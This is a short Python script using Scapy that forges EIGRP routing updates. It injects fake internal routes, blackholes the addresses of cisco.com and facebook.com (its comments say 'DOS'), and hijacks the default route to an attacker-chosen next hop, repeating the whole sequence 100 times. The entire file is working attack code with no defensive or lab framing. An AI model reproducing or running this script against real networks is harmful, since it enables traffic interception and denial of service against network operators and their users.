#HACK EIGRP - inject fake routes
#Import time so we can set a sleep timer
import time
#Import scapy
from scapy.all import *
#Import EIGRP
load_contrib('eigrp')

#For Loop to send multiple packets
for i in range (0,100):

    #Inject fake route
    sendp(Ether()/IP(src="192.168.1.248",dst="224.0.0.10") \
        /EIGRP(opcode="Update", asn=100, seq=(0,3), ack=0, \
        tlvlist=[EIGRPIntRoute(dst="192.168.100.0", nexthop="192.168.1.248")]))

    #Inject fake route
    sendp(Ether()/IP(src="192.168.1.248",dst="224.0.0.10") \
        /EIGRP(opcode="Update", asn=100, seq=(0,3), ack=0, \
        tlvlist=[EIGRPIntRoute(dst="192.168.101.0", nexthop="192.168.1.248")]))

    #DOS cisco.com - you will need to check which network is used
    sendp(Ether()/IP(src="192.168.1.248",dst="224.0.0.10") \
        /EIGRP(opcode="Update", asn=100, seq=(0,3), ack=0, \
        tlvlist=[EIGRPIntRoute(dst="72.163.4.185", nexthop="192.168.1.248")]))

    #DOS facebook.com - you will need to check which network is used
    sendp(Ether()/IP(src="192.168.1.248",dst="224.0.0.10") \
        /EIGRP(opcode="Update", asn=100, seq=(0,3), ack=0, \
        tlvlist=[EIGRPIntRoute(dst="157.240.239.35", nexthop="192.168.1.248")]))

    #Change default route
    sendp(Ether()/IP(src='192.168.1.248',dst='224.0.0.10') \
        /EIGRP(opcode="Update", asn=100, seq=(0,3), ack=0, \
        tlvlist=[EIGRPExtRoute(dst='0.0.0.0', nexthop='192.168.1.248', \
        originrouter='192.168.1.248', prefixlen=0, flags="candidate-default")]))

    time.sleep(2)